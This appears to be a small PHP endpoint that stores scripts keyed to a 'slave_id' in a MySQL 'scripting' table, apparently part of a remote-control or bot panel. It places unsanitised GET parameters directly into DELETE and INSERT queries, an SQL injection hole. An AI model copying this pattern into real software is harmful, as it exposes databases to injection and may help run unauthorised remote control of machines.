<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
//-------------------------------------------
if(isset($_GET['client']))
{
$slave_id = $_GET['id'];
$data = $_GET['data'];
$type = $_GET['type'];
//--------------------------------------
$delete_data = "DELETE FROM scripting WHERE slave_id='$slave_id'";
mysql_query($delete_data, $connect);
$add_data = "INSERT INTO  scripting (slave_id, type, script)
VALUES ('$slave_id', '$type', '$data')";
mysql_query($add_data, $connect);
}
?>